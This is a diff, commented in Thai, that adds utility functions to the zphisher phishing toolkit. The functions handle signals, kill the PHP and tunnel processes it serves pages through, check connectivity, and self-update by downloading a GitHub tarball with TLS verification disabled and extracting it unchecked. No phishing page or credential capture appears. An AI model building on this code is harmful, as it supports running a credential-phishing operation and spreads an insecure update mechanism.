@@ -121,3 +121,82 @@ fi
 if [[ -e ".server/.cld.log" ]]; then
         rm -rf ".server/.cld.log" # ลบไฟล์ .cld.log หากมีอยู่
 fi
+
+
+## การจัดการการหยุดการทำงานของสคริปต์
+exit_on_signal_SIGINT() {
+        # ฟังก์ชันที่ทำงานเมื่อกด Ctrl+C (SIGINT)
+        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+        exit 0
+}
+
+exit_on_signal_SIGTERM() {
+        # ฟังก์ชันที่ทำงานเมื่อได้รับสัญญาณ SIGTERM
+        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+        exit 0
+}
+
+# ดักจับสัญญาณ SIGINT และ SIGTERM
+trap exit_on_signal_SIGINT SIGINT
+trap exit_on_signal_SIGTERM SIGTERM
+
+## รีเซ็ตสีในเทอร์มินัลกลับเป็นค่าเริ่มต้น
+reset_color() {
+        tput sgr0   # รีเซ็ต attribute
+        tput op     # รีเซ็ตสี
+        return
+}
+
+## จัดการหยุดกระบวนการที่กำลังทำงานอยู่
+kill_pid() {
+        # รายชื่อโปรเซสที่ต้องการตรวจสอบและหยุด
+        check_PID="php cloudflared loclx"
+        for process in ${check_PID}; do
+                if [[ $(pidof ${process}) ]]; then # ตรวจสอบว่าโปรเซสกำลังทำงานหรือไม่
+                        killall ${process} > /dev/null 2>&1 # หยุดโปรเซส
+                fi
+        done
+}
+
+## ตรวจสอบว่ามีอัปเดตเวอร์ชันใหม่หรือไม่
+check_update(){
+        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+        relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest' # URL สำหรับตรวจสอบเวอร์ชันล่าสุด
+        new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}') # ดึงข้อมูลเวอร์ชันใหม่
+        tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz" # URL สำหรับไฟล์เวอร์ชันใหม่
+
+        if [[ $new_version != $__version__ ]]; then
+                # ถ้าพบว่าเวอร์ชันใหม่ไม่ตรงกับเวอร์ชันปัจจุบัน
+                echo -ne "${ORANGE}update found\n"${WHITE}
+                sleep 2
+                echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+                pushd "$HOME" > /dev/null 2>&1 # เปลี่ยนไดเรกทอรีไปยังโฟลเดอร์ Home
+                curl --silent --insecure --fail --retry-connrefused \
+                --retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}" # ดาวน์โหลดไฟล์อัปเดต
+
+                if [[ -e ".zphisher.tar.gz" ]]; then
+                        # ตรวจสอบว่าไฟล์ดาวน์โหลดสำเร็จหรือไม่
+                        tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1 # แตกไฟล์อัปเดต
+                        [ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
+                        rm -f .zphisher.tar.gz # ลบไฟล์ที่แตกเสร็จแล้ว
+                        popd > /dev/null 2>&1 # กลับไปยังไดเรกทอรีก่อนหน้า
+                        { sleep 3; clear; banner_small; }
+                        echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+                        { reset_color ; exit 1; }
+                else
+                        # ถ้าเกิดข้อผิดพลาดระหว่างดาวน์โหลด
+                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+                        { reset_color; exit 1; }
+                fi
+        else
+                # ถ้าเวอร์ชันปัจจุบันเป็นล่าสุดแล้ว
+                echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+        fi
+}
+
+## ตรวจสอบสถานะการเชื่อมต่ออินเทอร์เน็ต
+check_status() {
+        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+        timeout 3s curl -fIs "https://api.github.com" > /dev/null # ทดสอบการเชื่อมต่ออินเทอร์เน็ต
+        [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}" # แสดงสถานะว่าออนไลน์หรือออฟไลน์
+}
